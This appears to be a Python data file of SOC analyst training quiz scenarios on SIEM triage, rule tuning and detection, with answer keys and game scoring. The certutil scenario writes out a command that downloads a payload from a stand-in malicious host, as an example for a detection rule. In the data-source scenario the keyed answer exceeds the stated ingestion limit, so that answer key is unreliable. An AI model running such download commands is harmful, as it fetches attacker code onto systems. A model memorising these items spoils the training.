"""
Domain 1: SIEM Operations & Log Management scenarios.

Key SOC concepts tested:
- Alert triage and prioritization
- False positive identification
- Log correlation techniques
- SIEM rule tuning
- Query construction (SPL/KQL)
- Alert fatigue management
- Data source prioritization
- SOC metrics (MTTD/MTTR)

Each scenario uses a single "standard" professional theme.
"""

SOC_DOMAIN_1_SCENARIOS = [
    # Scenario 1: Alert Triage Prioritization
    {
        "id": "soc1_alert_triage",
        "domain": 1,
        "themes": {
            "standard": {
                "title": "THE MORNING QUEUE",
                "narrative": """
You arrive at the SOC for your 6 AM shift. The overnight analyst left 47 unreviewed
alerts in the queue. Your SIEM dashboard shows:

- 23 alerts: "Failed login attempts" (threshold: 5 failures in 10 min) from various IPs
- 12 alerts: "Large outbound data transfer" (>500MB) to cloud storage services
- 8 alerts: "PowerShell execution with encoded command" on finance workstations
- 4 alerts: "Antivirus disabled" events on developer machines

Coffee in hand, you need to prioritize. The shift lead will be checking in at 7 AM
and expects a status update.

Which alert category do you investigate FIRST?
                """,
                "choices": [
                    {"text": "Failed login attempts - they could indicate a brute force attack"},
                    {"text": "Large outbound transfers - potential data exfiltration"},
                    {"text": "PowerShell encoded commands - possible malicious script execution"},
                    {"text": "Antivirus disabled - security control circumvention"}
                ],
                "success_text": """
You pull up the PowerShell alerts immediately. Encoded PowerShell commands on finance
workstations - that's a high-fidelity indicator of potential compromise.

Within minutes, you've identified the encoded string decodes to a download cradle
pulling a second-stage payload from a known malicious domain. You escalate to Tier 2
and begin containment procedures.

The shift lead arrives to find you've already isolated two affected hosts and preserved
evidence. "Good call on the prioritization," she says. "Those login failures were just
Bob from accounting forgetting his password again. The data transfers were Marketing
uploading campaign videos. But this PowerShell activity? That's our incident."

PRIORITIZATION PRINCIPLE: High-fidelity, high-impact alerts take priority over
high-volume, low-fidelity alerts. Encoded PowerShell on business workstations
represents potential active compromise - it's not a normal business activity.
                """,
                "failure_texts": {
                    0: """
Failed logins are important, but they're incredibly common and usually benign - users
forgetting passwords, fat-fingering credentials, or password managers misfiring. With
23 alerts across "various IPs," this looks like normal business noise, not a coordinated
attack.

While you investigated authentication logs, the PowerShell alerts represented ACTIVE
malicious code execution. Those encoded commands were download cradles for ransomware.
By the time you noticed, the attackers had lateral movement across the finance department.

LESSON: Prioritize alerts by FIDELITY (how likely is this actually malicious?) and
IMPACT (what's the potential damage?), not just volume.
                    """,
                    1: """
Large outbound transfers seem alarming, but to cloud storage services? That's normal
business activity in 2024. Marketing uploads campaigns to Google Drive. Engineering
syncs code to GitHub. Sales shares presentations via Dropbox.

The 12 alerts needed context - WHO was transferring WHAT to WHERE - but they weren't
your priority. While you traced Marketing's video uploads, encoded PowerShell executed
download cradles across finance workstations.

LESSON: Data loss prevention alerts require context. "Large transfer" isn't inherently
malicious. "Encoded PowerShell execution" on business workstations almost always is.
                    """,
                    3: """
Antivirus disabled on developer machines? That's actually expected behavior - devs
often disable AV because it interferes with compilation, testing, or performance.
It's a known risk that should be addressed through policy, not an active incident.

The 4 alerts were from the same developer team that always does this. Meanwhile,
encoded PowerShell commands were executing on finance workstations - users who have
NO legitimate reason to run PowerShell, let alone encoded commands.

LESSON: Context matters. "Expected but undesirable" is different from "unexpected
and suspicious." Developer AV exceptions are the former; finance PowerShell is the latter.
                    """
                }
            }
        },
        "correct_index": 2,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Alert prioritization is a critical SOC skill. Key factors:
1. FIDELITY - How likely is this alert to be a true positive?
2. IMPACT - What's the potential damage if this is real?
3. CONTEXT - Is this activity expected for this user/system?
4. URGENCY - Is the threat active or historical?
        """,
        "domain_reference": "SOC Domain 1: SIEM Operations - Alert Triage and Prioritization"
    },

    # Scenario 2: False Positive Management
    {
        "id": "soc1_false_positive",
        "domain": 1,
        "themes": {
            "standard": {
                "title": "THE RECURRING ALERT",
                "narrative": """
Your SIEM has generated 847 alerts in the past 24 hours for the same detection rule:
"Suspicious outbound connection to rare external IP." Every alert originates from
server WEBSRV-PROD-03.

You investigate and find:
- All connections go to IP 203.0.113.47, owned by a CDN provider
- Traffic pattern: consistent 5-minute intervals, 24/7
- Packet captures show HTTPS traffic with normal TLS handshakes
- The server runs the company's main web application

The detection rule was written to catch C2 beaconing. Your senior analyst asks
what you recommend for handling this alert pattern.

What do you propose?
                """,
                "choices": [
                    {"text": "Disable the detection rule - it's generating too much noise"},
                    {"text": "Add WEBSRV-PROD-03 to a global whitelist for all detection rules"},
                    {"text": "Tune the rule to exclude the specific IP and document the exception"},
                    {"text": "Continue monitoring - we can't risk missing a real C2 beacon"}
                ],
                "success_text": """
You draft a tuning request: "Add exception for WEBSRV-PROD-03 to 203.0.113.47 (CDN
health checks, verified with application team). Exception documented in whitelist
register with ticket #INC-4721. Rule remains active for all other traffic patterns."

The senior analyst approves. "Perfect approach. You verified the traffic is legitimate,
created a SPECIFIC exception rather than a broad whitelist, documented the justification,
and preserved the rule's ability to catch actual threats."

She adds: "The worst thing we can do is disable good rules or create broad whitelists.
That's how attackers hide - they blend into approved exceptions. But 847 alerts that
we KNOW are false positives? That's alert fatigue waiting to happen. A targeted,
documented tune is the right call."

TUNING PRINCIPLE: Good tuning is SPECIFIC (exact source/destination), DOCUMENTED
(justification recorded), and PRESERVES detection capability for genuine threats.
                """,
                "failure_texts": {
                    0: """
Disabling the rule eliminates ALL visibility into this attack pattern, not just for
this server. Real C2 beacons to rare external IPs will now go undetected.

The rule itself isn't bad - it's catching exactly what it's designed to catch. The
problem is that THIS specific traffic pattern is legitimate. Disabling the whole
rule is like unplugging the smoke detector because you burned toast.

LESSON: Tune rules with precision. Don't disable detection capability because of
one false positive source.
                    """,
                    1: """
A GLOBAL whitelist for this server means it will never trigger ANY alerts - not just
this rule, but all current and future detection rules. If this server gets compromised
tomorrow, you'll see nothing.

Global whitelists are the #1 way attackers hide. They compromise a "trusted" system
and leverage its exemptions. One legitimate CDN connection doesn't justify removing
all monitoring.

LESSON: Exceptions should be SPECIFIC - this rule, this source, this destination.
Never global.
                    """,
                    3: """
"Continue monitoring" 847 alerts per day? That's 35 alerts per hour, one every 2
minutes. You physically cannot review each one meaningfully, and critical alerts
WILL get lost in the noise.

Alert fatigue is a documented cause of breach escalation. When analysts see the same
false positive hundreds of times, they stop looking carefully. The one time it ISN'T
a false positive? It gets auto-closed with the rest.

LESSON: Unactionable alerts create unacceptable risk. Tune thoughtfully or drown.
                    """
                }
            }
        },
        "correct_index": 2,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
SIEM tuning principles:
1. Never disable rules - tune them with specific exceptions
2. Never use global whitelists - use rule-specific, documented exceptions
3. Always verify before tuning - confirm the traffic is truly legitimate
4. Document everything - exceptions need justification for audit
        """,
        "domain_reference": "SOC Domain 1: SIEM Operations - Rule Tuning and False Positive Management"
    },

    # Scenario 3: Log Correlation - Impossible Travel
    {
        "id": "soc1_impossible_travel",
        "domain": 1,
        "themes": {
            "standard": {
                "title": "THE GLOBE-TROTTER",
                "narrative": """
Your SIEM correlation rule triggers: "Impossible travel detected." The alert shows:

User: sarah.chen@company.com (VP of Engineering)
- 09:15 AM EST: Successful VPN login from New York, NY (Office IP)
- 09:47 AM EST: Successful O365 login from Lagos, Nigeria
- Time between logins: 32 minutes
- Distance: ~5,200 miles

Sarah is currently in the New York office - you can see her badge-in at 8:45 AM.
The Nigeria login accessed SharePoint and downloaded 3 engineering documents.

IT Help Desk has no tickets from Sarah about VPN or O365 issues. Your correlation
engine gives this a 94% confidence score.

What is your NEXT step?
                """,
                "choices": [
                    {"text": "Close as false positive - VPNs and proxies cause these alerts frequently"},
                    {"text": "Disable Sarah's account immediately and investigate"},
                    {"text": "Escalate to Tier 2 and notify Sarah's manager before taking action"},
                    {"text": "Verify with Sarah directly, then contain if confirmed unauthorized"}
                ],
                "success_text": """
You call Sarah directly. "Ms. Chen, this is the Security Operations Center. We detected
a login to your O365 account from Nigeria at 9:47 AM. Were you expecting that?"

"Nigeria? Absolutely not. I've been in meetings all morning."

With verbal confirmation, you proceed:
1. Force sign-out of all O365 sessions
2. Reset Sarah's password via admin portal
3. Review and revoke any new OAuth app consents
4. Check what documents were accessed/downloaded
5. Document the timeline for IR team

Sarah's account was compromised via a phishing kit that harvested her credentials.
The attacker had 32 minutes of access before you contained it.

VERIFICATION PRINCIPLE: Impossible travel is high-confidence but not infallible.
A quick verification call (30 seconds) confirms the incident and prevents disrupting
legitimate users. Then contain immediately.
                """,
                "failure_texts": {
                    0: """
This isn't a VPN or proxy situation - Sarah badge-in PROVES she was physically in
New York. The Nigeria login is from a completely different IP range, not a corporate
proxy.

While you closed the "false positive," the attacker continued exfiltrating engineering
documents. Two hours later, competitor products appeared with suspicious similarities.

LESSON: "Impossible travel" with physical badge verification isn't a VPN artifact.
The badge-in data CONFIRMS she was in New York. Take it seriously.
                    """,
                    1: """
Immediate account lockout protects the account, but without verification, you just:
- Locked out a VP in the middle of important meetings
- Caused a help desk ticket flood
- Started an incident response process for what MIGHT be legitimate

What if Sarah had connected through a corporate proxy in Nigeria for a partner meeting?
Or if her admin assistant was testing access from a remote office?

LESSON: 30 seconds of verification prevents unnecessary disruption. Verify THEN contain.
                    """,
                    2: """
Escalating to Tier 2 and notifying management creates delays. While you wait for
approval chains and manager callbacks, the attacker continues operating with
Sarah's credentials.

The manager asks: "Did you verify with Sarah directly? She's right here with me."

The 15-minute delay cost the company additional document exposure and complicated
the forensic timeline.

LESSON: For active account compromise, the first-line analyst can verify and contain.
Don't wait for management approval to protect a compromised account.
                    """
                }
            }
        },
        "correct_index": 3,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Impossible travel investigation:
1. VERIFY physical location if possible (badge data, manager confirmation)
2. CONTACT the user directly to confirm activity
3. CONTAIN immediately upon confirmation of unauthorized access
4. DOCUMENT the timeline and actions taken
        """,
        "domain_reference": "SOC Domain 1: SIEM Operations - Log Correlation and Impossible Travel"
    },

    # Scenario 4: SIEM Query Construction
    {
        "id": "soc1_query_construction",
        "domain": 1,
        "themes": {
            "standard": {
                "title": "THE HUNT BEGINS",
                "narrative": """
Threat Intelligence has shared an advisory: "APT group NIGHTFALL uses scheduled tasks
named 'ChromeUpdate' or 'AdobeFlashUpdate' for persistence. Look for schtasks.exe
creating tasks with these names."

You need to write a SIEM query to detect this across your Windows endpoints. Your
SIEM uses a Splunk-like query language.

The relevant log field names in your environment:
- process_name: The executable that ran
- command_line: Full command line arguments
- event_type: Type of event (process_create, network_connect, etc.)

Which query correctly identifies the threat behavior?
                """,
                "choices": [
                    {"text": "index=windows process_name=schtasks.exe"},
                    {"text": "index=windows event_type=process_create process_name=schtasks.exe command_line=*ChromeUpdate* OR command_line=*AdobeFlashUpdate*"},
                    {"text": "index=windows ChromeUpdate OR AdobeFlashUpdate"},
                    {"text": "index=windows | search schtasks | search Chrome OR Adobe"}
                ],
                "success_text": """
Your query runs and returns 3 hits from the past 7 days - all from the same workstation.

Query breakdown:
- index=windows: Limits to Windows endpoint logs
- event_type=process_create: Only looks at process execution events
- process_name=schtasks.exe: Filters to the scheduled task utility
- command_line=*ChromeUpdate* OR command_line=*AdobeFlashUpdate*: Matches the specific
  malicious task names (wildcards catch variations)

This query is PRECISE - it finds exactly what the threat intel described:
schtasks.exe creating tasks with those specific names.

You escalate the 3 hits. Investigation reveals a compromised workstation with an
APT implant using the "ChromeUpdate" scheduled task for persistence - exactly as
the intel predicted.

QUERY PRINCIPLE: Effective hunting queries are specific to the behavior described.
Include all relevant filters (process name, event type, command line patterns) to
reduce false positives while catching the actual threat.
                """,
                "failure_texts": {
                    0: """
This query returns EVERY schtasks.exe execution - legitimate system administration,
Group Policy applications, software installations, and more. You'll get thousands
of results with no way to distinguish malicious from normal.

The threat intel specified particular TASK NAMES. Without filtering for those names
in the command line, you're searching for a needle in a haystack without a magnet.

LESSON: Queries must include all relevant context from the intel. "schtasks.exe" alone
is too broad - add the specific indicators (task names) to make it actionable.
                    """,
                    2: """
This query searches for the strings "ChromeUpdate" or "AdobeFlashUpdate" ANYWHERE in
the logs - including in unrelated fields like usernames, file paths, or descriptions.

You'd match:
- A user named "CChromeupdater"
- A file path containing "AdobeFlashUpdater.exe"
- A comment field mentioning Chrome updates

None of these are the schtasks.exe persistence mechanism described in the intel.

LESSON: Specify WHICH FIELD to search. Raw string matching across all fields creates
noise and misses the actual threat pattern.
                    """,
                    3: """
Piped searches with broad terms like "schtasks" and "Chrome OR Adobe" are inefficient
and imprecise:
- "schtasks" as raw text might match comments, paths, or unrelated fields
- "Chrome OR Adobe" matches ANY mention of these words, not task names
- Multiple pipes without field specification creates a confusing, slow query

This query might catch the threat, but it also catches thousands of false positives
and takes minutes to run instead of seconds.

LESSON: Use explicit field filters (process_name=, command_line=) instead of raw
text searches. Be precise about what you're looking for.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Effective SIEM query construction:
1. START with the data source (index, sourcetype)
2. FILTER by event type (process_create, network_connect)
3. ADD specific field matches (process_name, command_line)
4. USE wildcards appropriately for variations
5. TEST on a time-limited range before running broad searches
        """,
        "domain_reference": "SOC Domain 1: SIEM Operations - Query Construction and Threat Hunting"
    },

    # Scenario 5: SIEM Rule Creation
    {
        "id": "soc1_rule_creation",
        "domain": 1,
        "themes": {
            "standard": {
                "title": "THE DETECTION GAP",
                "narrative": """
After a recent incident, your IR team identified a gap: attackers used certutil.exe
to download malicious payloads, but no SIEM rule detected it.

You're tasked with creating a detection rule. Which rule logic BEST detects
certutil abuse while minimizing false positives?

The relevant log fields:
- process_name: Executable name
- command_line: Full command arguments
- parent_process: Process that spawned this one
                """,
                "choices": [
                    {"text": "Alert on any certutil.exe execution"},
                    {"text": "Alert on certutil.exe with '-urlcache' AND '-f' in command line"},
                    {"text": "Alert on certutil.exe only when parent process is cmd.exe or powershell.exe"},
                    {"text": "Alert on certutil.exe with command line containing 'http' or 'https'"}
                ],
                "success_text": """
You implement the rule: "Alert when process_name=certutil.exe AND command_line
contains '-urlcache' AND command_line contains '-f'"

This catches the specific abuse technique:
- certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\\temp\\file.exe

The flags "-urlcache -f" are required to download files. Legitimate certificate
operations (certutil -verify, certutil -store) don't use these flags.

After one week:
- 4 alerts total
- 3 were legitimate (IT automation scripts for cert deployment - you whitelist those)
- 1 was a red team exercise that would have been a real attack

Low volume, high fidelity, actionable alerts. That's the goal.

DETECTION PRINCIPLE: Target the specific malicious TECHNIQUE, not just the tool.
Certutil.exe is legitimate; certutil.exe downloading files from URLs is suspicious.
                """,
                "failure_texts": {
                    0: """
Alerting on ANY certutil.exe execution floods you with false positives:
- Windows Certificate Services uses certutil
- PKI administrators use it for certificate management
- Group Policy uses it for certificate deployment

You'd get hundreds of alerts daily, all legitimate. The one real attack would be
buried in noise.

LESSON: Detect the BEHAVIOR, not the TOOL. Certutil doing normal cert work is fine.
Certutil downloading files is not.
                    """,
                    2: """
Parent process filtering (cmd.exe or powershell.exe) catches some attacks, but:
- Legitimate admins also run certutil from cmd/powershell
- Attackers can launch certutil from other processes (wscript.exe, mshta.exe)

This rule is both too broad (catches legit admin work) and too narrow (misses
creative attack chains).

LESSON: Parent process is useful context, but the malicious BEHAVIOR (downloading
files) is the key indicator.
                    """,
                    3: """
Looking for 'http' in the command line SEEMS right, but has problems:
- Legitimate certutil commands can contain URLs (certutil -verify https://crl.example.com)
- Attackers might use IP addresses instead of URLs
- The download functionality specifically uses '-urlcache -f', not just HTTP URLs

This creates false positives from legitimate CRL checks and false negatives from
IP-based attacks.

LESSON: Understand the specific SYNTAX of the attack. The '-urlcache -f' flags are
the key indicator, not just the presence of URLs.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Detection rule design principles:
1. TARGET THE TECHNIQUE - What specific behavior indicates malicious use?
2. UNDERSTAND LEGITIMATE USE - What does normal look like?
3. MINIMIZE FALSE POSITIVES - Be specific enough to be actionable
4. AVOID FALSE NEGATIVES - Don't make the rule easy to bypass
        """,
        "domain_reference": "SOC Domain 1: SIEM Operations - Detection Rule Engineering"
    },

    # Scenario 6: Alert Fatigue Management
    {
        "id": "soc1_alert_fatigue",
        "domain": 1,
        "themes": {
            "standard": {
                "title": "THE DROWNING SOC",
                "narrative": """
Your SOC is struggling. Key metrics from last month:
- 45,000 alerts generated
- 2,100 alerts reviewed (4.7% review rate)
- Average time-to-triage: 4.2 hours
- 3 confirmed incidents - all discovered by users reporting issues, not SOC detection

The CISO is frustrated: "We're paying for a SIEM that generates noise and a SOC that
can't keep up. What's the fix?"

Your team has identified that 80% of alerts come from 5 detection rules, all with
high false positive rates. What do you recommend?
                """,
                "choices": [
                    {"text": "Hire more analysts to review all 45,000 alerts"},
                    {"text": "Disable the 5 noisy rules to reduce alert volume by 80%"},
                    {"text": "Implement tiered triage - auto-close low-confidence, prioritize high-fidelity"},
                    {"text": "Tune the 5 rules to reduce false positives while maintaining detection value"}
                ],
                "success_text": """
You propose a tuning initiative: "These 5 rules are detecting SOMETHING, but they're
too broad. Let's analyze the false positives and add specific exclusions."

Week 1-2: Analyze false positives for each rule
- Rule 1: 90% false positives from known backup server - add exclusion
- Rule 2: Triggers on legitimate admin tool - adjust detection logic
- Rule 3: Overly broad IP reputation - increase confidence threshold
- Rule 4: Noisy AV alerts - deduplicate and suppress informational severity
- Rule 5: Misconfigured log source - fix source, then re-enable rule

Month 2 metrics:
- 8,500 alerts generated (81% reduction)
- 7,200 alerts reviewed (85% review rate)
- Average time-to-triage: 12 minutes
- 2 confirmed incidents - both detected by SOC before user reports

Same team, same SIEM, dramatically better outcomes.

FATIGUE PRINCIPLE: Alert volume is not alert quality. Fewer, higher-fidelity alerts
enable meaningful human review. Tuning is not weakness - it's optimization.
                """,
                "failure_texts": {
                    0: """
More analysts reviewing the same noisy alerts doesn't fix the problem - it scales
the dysfunction. At 4.7% review rate, even tripling the team only gets you to ~14%.

And those analysts will burn out reviewing the same false positives all day. Analyst
turnover in noisy SOCs is extremely high.

LESSON: You can't out-staff a tuning problem. Fix the alerts, not the headcount.
                    """,
                    1: """
Disabling the rules eliminates the noise but also eliminates detection capability.
Those rules were created to detect something - what happens when that something
occurs and you have no visibility?

"We got breached but at least our dashboard was clean" is not a defensible position.

LESSON: Never disable detection rules because of false positives. Tune them to
be more specific while maintaining the core detection capability.
                    """,
                    2: """
"Auto-close low-confidence" is just automated ignoring. If the rules aren't worth
reviewing, they shouldn't be generating alerts in the first place.

Tiered triage helps with prioritization but doesn't address the root cause: the
rules are too broad. You're still generating 45,000 alerts; you're just ignoring
most of them automatically.

LESSON: Triage optimization helps, but the real fix is improving alert quality
at the source. Don't automate ignoring bad alerts - fix the alerts.
                    """
                }
            }
        },
        "correct_index": 3,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Alert fatigue management:
1. IDENTIFY high-volume, low-value rules
2. ANALYZE false positive patterns
3. TUNE rules with specific, documented exceptions
4. MEASURE before/after metrics
5. ITERATE continuously - tuning is ongoing
        """,
        "domain_reference": "SOC Domain 1: SIEM Operations - Alert Fatigue and SOC Optimization"
    },

    # Scenario 7: Data Source Prioritization
    {
        "id": "soc1_data_source",
        "domain": 1,
        "themes": {
            "standard": {
                "title": "THE ONBOARDING DECISION",
                "narrative": """
Your SIEM license allows for 500 GB/day of log ingestion. You're currently at
420 GB/day. The security team has identified 4 new data sources they want to add,
but together they'd exceed your limit by 200 GB/day.

You need to prioritize. Only 2 can be added now. The options:

A) Windows Security Event Logs from 200 remaining workstations (95 GB/day)
   - Currently only monitoring servers, not all workstations

B) Cloud WAF logs from AWS (60 GB/day)
   - All external web traffic, already have network IDS

C) DNS query logs from internal resolvers (120 GB/day)
   - Would enable DNS exfiltration and C2 detection

D) Badge access logs from physical security (5 GB/day)
   - Useful for insider threat and impossible travel correlation

Which TWO data sources provide the MOST security value?
                """,
                "choices": [
                    {"text": "A and C - Endpoint visibility and DNS are foundational"},
                    {"text": "B and D - External threats and physical security"},
                    {"text": "A and B - Endpoints and web application protection"},
                    {"text": "C and D - DNS detection and insider threat correlation"}
                ],
                "success_text": """
You recommend C (DNS logs) and D (Badge access):

DNS Query Logs (120 GB/day):
- Enables detection of DNS tunneling and exfiltration
- C2 beaconing often uses DNS for resilience
- Catches threats that bypass network IDS via encrypted DNS
- High detection value per GB - DNS is compact but information-rich

Badge Access Logs (5 GB/day):
- Enables impossible travel detection (badge-in NY, VPN from Russia)
- Insider threat correlation (badge-out at 5 PM, data access at 3 AM)
- Extremely high value for minimal storage cost
- Correlates digital and physical security

Together: 125 GB/day for two high-value detection capabilities.

You can add Windows workstation logs (A) in the next budget cycle - they're
valuable but you already have server visibility. Cloud WAF (B) duplicates your
IDS capability.

PRIORITIZATION PRINCIPLE: Value per GB matters. DNS and badge logs are information-
dense. Choose sources that enable NEW detection capabilities, not redundant ones.
                """,
                "failure_texts": {
                    0: """
Windows workstation logs (A) are valuable, but at 95 GB/day they consume most of
your remaining budget for incremental improvement - you already have server logs.

Combined with DNS (120 GB/day), you're at 215 GB/day - exceeding your 80 GB buffer
and leaving nothing for badge logs (5 GB/day) which enable impossible travel and
insider threat detection.

LESSON: Consider value per GB. Badge logs at 5 GB/day enable detection capabilities
that 95 GB of additional workstation logs don't provide.
                    """,
                    1: """
Cloud WAF logs (B) largely duplicate your existing network IDS visibility on
external traffic. Adding 60 GB/day for redundant coverage is inefficient.

Badge logs (D) are valuable, but without DNS logs (C) you miss critical detection
capabilities like DNS exfiltration and C2 beaconing over DNS.

LESSON: Prioritize NEW detection capabilities over redundant coverage. WAF + IDS
is overlap; DNS + Badge is complementary.
                    """,
                    2: """
Windows workstations (A) + Cloud WAF (B) = 155 GB/day

This uses your entire budget for:
- Incremental endpoint improvement (already have servers)
- Redundant web traffic visibility (already have IDS)

You miss DNS detection (C) and physical correlation (D) - both entirely NEW
capabilities that enable threat detection you currently cannot perform.

LESSON: "More of the same" isn't always better. Prioritize breadth of detection
over depth in areas you already cover.
                    """
                }
            }
        },
        "correct_index": 3,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Data source prioritization:
1. IDENTIFY gaps in detection capability
2. EVALUATE value per GB of storage
3. AVOID redundant coverage
4. ENABLE new detection use cases
5. CONSIDER correlation value (how does this connect to other data?)
        """,
        "domain_reference": "SOC Domain 1: SIEM Operations - Data Source Prioritization and Onboarding"
    },

    # Scenario 8: SOC Metrics and KPIs
    {
        "id": "soc1_soc_metrics",
        "domain": 1,
        "themes": {
            "standard": {
                "title": "THE EXECUTIVE DASHBOARD",
                "narrative": """
The CISO wants a dashboard showing SOC effectiveness. She's asked for metrics that
demonstrate value to the board. Your current tracking includes:

- Total alerts generated: 45,000/month
- Alerts reviewed: 2,100/month
- Mean Time to Detect (MTTD): 4.2 hours
- Mean Time to Respond (MTTR): 12.7 hours
- True Positive Rate: 3.2%
- Incidents escalated: 67/month
- Incidents confirmed: 8/month

The CISO asks: "Which metrics should I show the board to demonstrate we're improving?"

What do you recommend as the PRIMARY metrics for executive reporting?
                """,
                "choices": [
                    {"text": "Total alerts generated - shows SIEM is working hard"},
                    {"text": "MTTD and MTTR - shows speed of detection and response"},
                    {"text": "Alerts reviewed count - shows analyst productivity"},
                    {"text": "True positive rate - shows percentage of real threats"}
                ],
                "success_text": """
"MTTD and MTTR," you recommend. "These are the metrics that matter to business risk."

You explain:
- MTTD (Mean Time to Detect): How long threats operate before we notice
- MTTR (Mean Time to Respond): How long from detection to containment

"The board doesn't care about alert volume - that's an operational detail. They care
about risk reduction. MTTD and MTTR directly correlate to breach impact."

You build the executive dashboard:
- MTTD trend: 4.2 hours → (goal: <1 hour)
- MTTR trend: 12.7 hours → (goal: <4 hours)
- Dwell time reduction: Shows how improvements reduce attacker opportunity

The CISO presents to the board: "We've reduced mean time to detect from 4 hours to
45 minutes. That means attackers have 3 fewer hours to operate before we catch them.
Each hour of reduced dwell time prevents potential data exfiltration."

METRICS PRINCIPLE: Executive metrics should tie to BUSINESS RISK, not operational
volume. MTTD and MTTR are universally understood indicators of security effectiveness.
                """,
                "failure_texts": {
                    0: """
"Total alerts generated" shows the SIEM is creating noise, not that security is
improving. More alerts can mean worse tuning, not better detection.

The board would ask: "So... more alerts means we're more secure?" No. It might mean
you're detecting the same benign activity thousands of times.

LESSON: Volume metrics are vanity metrics. They don't correlate to security outcomes.
                    """,
                    2: """
"Alerts reviewed" measures analyst activity, not security outcomes. If your team
reviewed 10,000 false positives, that's not a win - that's wasted effort.

The board cares about threats stopped, not spreadsheets filled. Productivity metrics
belong in operational dashboards, not executive reporting.

LESSON: Executive metrics should tie to OUTCOMES (threats detected, breaches prevented)
not ACTIVITIES (alerts reviewed, hours worked).
                    """,
                    3: """
True positive rate (3.2%) is actually an embarrassing metric - it shows that 96.8%
of your alerts are false positives. Do you want to tell the board that?

TPR is an important operational metric for tuning, but it's not a headline number
for executives. They want to know "are we getting better?" not "our alerts are
mostly noise."

LESSON: Context matters for metrics. TPR is diagnostic, not demonstrative. Use
MTTD/MTTR to show improvement trajectory.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
SOC metrics hierarchy:
EXECUTIVE: MTTD, MTTR, dwell time, incidents prevented (business risk)
OPERATIONAL: True positive rate, alerts reviewed, coverage gaps (efficiency)
TECHNICAL: Log volume, query performance, uptime (infrastructure)

Match the metric to the audience. Executives need business risk indicators.
        """,
        "domain_reference": "SOC Domain 1: SIEM Operations - SOC Metrics and KPIs"
    }
]
